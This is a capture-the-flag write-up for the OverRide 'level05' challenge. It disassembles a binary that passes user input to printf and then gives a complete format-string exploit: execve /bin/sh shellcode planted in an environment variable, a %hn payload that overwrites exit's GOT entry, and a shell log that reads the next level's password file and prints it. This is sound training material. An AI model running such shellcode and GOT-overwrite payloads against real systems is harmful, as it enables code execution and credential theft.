### notes
```c
0x08048444  main
```
---
### 0x080486c8 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c
{
	// 0x1c ... 28
	// 0x90 ... 144
	// 0x64 ... 100
	// 0x28 ... 40
	// 0x8c ... 140

	buffer1[100] = esp+0x28(40)
	int i = esp+0x8c(140) = 0
}
```
- **`<+0> ➜ <+6> : prepare stack frame for main function with size 144`**
```c
0x08048444 <+0>:	push   ebp
0x08048445 <+1>:	mov    ebp,esp
0x08048447 <+3>:	push   edi
0x08048448 <+4>:	push   ebx
0x08048449 <+5>:	and    esp,0xfffffff0
0x0804844c <+8>:	sub    esp,144
```
- **`<+14> ➜ <+49> : take input frm user up to 100 bytes and save it to buffer1`**
```c
0x08048452 <+14>:	mov    DWORD PTR [i], 0
0x0804845d <+25>:	mov    eax,ds:0x80497f0 // stdin
0x08048462 <+30>:	mov    DWORD PTR [esp + 8],eax
0x08048466 <+34>:	mov    DWORD PTR [esp + 4],100
0x0804846e <+42>:	lea    eax,[buffer1]
0x08048472 <+46>:	mov    DWORD PTR [esp],eax
0x08048475 <+49>:	call   0x8048350 <fgets@plt>
fgets(buffer1, 100, stdin)
```
- **`<+54> ➜ <+186> : loop through the buffer1 and verify its bytes, if between 64 and 90, to xor each by 32 if true`**
```c
0x0804847a <+54>:	mov    DWORD PTR [i], 0
0x08048485 <+65>:	jmp    0x80484d3 <main+143>
do {
	0x08048487 <+67>:	lea    eax,[buffer1]
	0x0804848b <+71>:	add    eax,DWORD PTR [i]
	0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
	0x08048495 <+81>:	cmp    al,0x40
	0x08048497 <+83>:	jle    0x80484cb <main+135>
	if (buffer[i] > 64) {
		0x08048499 <+85>:	lea    eax,[buffer1]
		0x0804849d <+89>:	add    eax,DWORD PTR [i]
		0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
		0x080484a7 <+99>:	cmp    al,0x5a
		0x080484a9 <+101>:	jg     0x80484cb <main+135>
		if (buffer[i] < 90) {
			0x080484ab <+103>:	lea    eax,[buffer1]
			0x080484af <+107>:	add    eax,DWORD PTR [i]
			0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
			0x080484b9 <+117>:	mov    edx,eax
			0x080484bb <+119>:	xor    edx,0x20
			0x080484be <+122>:	lea    eax,[buffer1]
			0x080484c2 <+126>:	add    eax,DWORD PTR [i]
			0x080484c9 <+133>:	mov    BYTE PTR [eax],
			buffer[i] = buffer[i] ^ 32
		}
	}
	0x080484cb <+135>:	add    DWORD PTR [i], 1
	i++;

	0x080484d3 <+143>:	mov    ebx,DWORD PTR [i]
	0x080484da <+150>:	lea    eax,[buffer1]
	0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
	0x080484e6 <+162>:	mov    edx,eax
	0x080484e8 <+164>:	mov    eax,0x0
	0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
	0x080484f1 <+173>:	mov    edi,edx
	0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
	0x080484f5 <+177>:	mov    eax,ecx
	0x080484f7 <+179>:	not    eax
	0x080484f9 <+181>:	sub    eax,0x1
	0x080484fc <+184>:	cmp    ebx,eax
	0x080484fe <+186>:	jb     0x8048487 <main+67>
} while (i < strlen(buffer))
```
- **`<+188> ➜ <+195> : print buffer1 with 'printf'`**
```c
0x08048500 <+188>:	lea    eax,[buffer1]
0x08048504 <+192>:	mov    DWORD PTR [esp],eax
0x08048507 <+195>:	call   0x8048340 <printf@plt>
printf(buffer1);
```
- **`<+200> ➜ <+207> : exit with code 0`**
```c
0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
0x08048513 <+207>:	call   0x8048370 <exit@plt>
exit(0);
```

### Code Prediction
```c
int main(int argc(ebp + 8), char **argv(ebp+12)) {
	int i = 0;
	buffer1[100];
	fgets(buffer1, 100, stdin);

	do {
		if (buffer[i] > 64) {
			if (buffer[i] < 90) {
				buffer[i] = buffer[i] ^ 32
			}
		}
		i++;

	} while (i < strlen(buffer))
 
	printf(buffer1);
	exit(0);
}
```

### Stack Illustration
N/A

### Process of the Exploit
- the program takes an input and print it with printf
- the buffer length is 100 bytes length max
- cant save the shellcode in the buffer due to the xor check
- we save shellcode in the env variable
- overwrite the got of exit jump address with the shellcode nopslide address
- shellcode used here : 
	```
	\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
	```
- 
	```
	export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
	```
- list the env variables with address in gdb : **`x/200s environ`**
---

### Solution :
address of shellcode in env : **`0xffffdc64`**(hex) : `4294958180` (dec)
first 2 bytes : **`0xffff`**(hex) : `65535` (dec)
last 2 bytes : **`0xdc64`**(hex) : `56420` (dec)
final payload : **`(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56412c"+"%10$hn"+"%9115c"+"%11$hn"' ;cat -) | ./level05`**

- 
```shell
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56412c"+"%10$hn"+"%9115c"+"%11$hn"' ;cat -) | ./level05
� d �
whoami
level06
pwd
/home/users/level05
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```
|**`flag : h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`**
---

### Ressources :
N/A
